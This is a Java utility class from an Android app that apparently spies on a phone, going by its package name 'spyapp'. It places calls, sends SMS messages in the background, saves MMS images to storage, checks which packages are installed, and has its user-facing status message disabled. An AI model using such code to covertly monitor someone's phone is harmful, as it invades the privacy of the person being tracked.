package com.app.spyapp.common;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Environment;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Random;

public class Utils {


    /**
     * get the path of App where file are stores
     *
     * @return
     */
    public static String getPathofFiles() {
        String path = Environment.getExternalStorageDirectory() + File.separator + Const.APPFOLDER;
        return path;
    }

    public static void makeCall(Context context, String number) {

        Intent callIntent = new Intent(Intent.ACTION_CALL);
        callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        callIntent.setPackage("com.android.server.telecom");
        callIntent.setData(Uri.parse("tel:" + number));
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        context.startActivity(callIntent);
    }

    /**
     * Send SMS for timer sync if internet is not available
     *
     * @param phoneNumber
     * @param message
     */
    public static void sendSMSForTimerSync(String phoneNumber, String message) {

        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    public static String convertMilisToDate(long milis) {
        // Create a DateFormatter object for displaying date in specified format.
        SimpleDateFormat formatter = new SimpleDateFormat(Const.DATEFORMATE);
        // Create a calendar object that will convert the date and time value in milliseconds to date.
        return formatter.format(milis);
    }

    public static String getCurrentTime() {
        // Create a DateFormatter object for displaying date in specified format.
        SimpleDateFormat formatter = new SimpleDateFormat(Const.DATEFORMATE);
        // Create a calendar object that will convert the date and time value in milliseconds to date.
        return formatter.format(Calendar.getInstance().getTimeInMillis());
    }

    public static void showStatus(Context context, String message) {
        //Toast.makeText(context, message, Toast.LENGTH_LONG).show();
    }

    /**
     * Store image to speficpath
     *
     * @param finalBitmap
     * @return
     */
    public static String storeImage(Bitmap finalBitmap) {

        String root = Utils.getPathofFiles();
        File myDir = new File(root + "/MMS");
        myDir.mkdirs();
        Random generator = new Random();
        String fname = "Image-" + System.currentTimeMillis() + ".jpg";
        File file = new File(myDir, fname);
        if (file.exists()) file.delete();
        try {
            FileOutputStream out = new FileOutputStream(file);
            finalBitmap.compress(Bitmap.CompressFormat.JPEG, 90, out);
            out.flush();
            out.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

        return file.getPath();

    }

    /**
     * check weather application is install or not
     * @param packagename
     * @param context
     * @return
     */
    public static boolean isPackageInstalled(String packagename, Context context) {
        PackageManager pm = context.getPackageManager();
        try {
            pm.getPackageInfo(packagename, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }
}
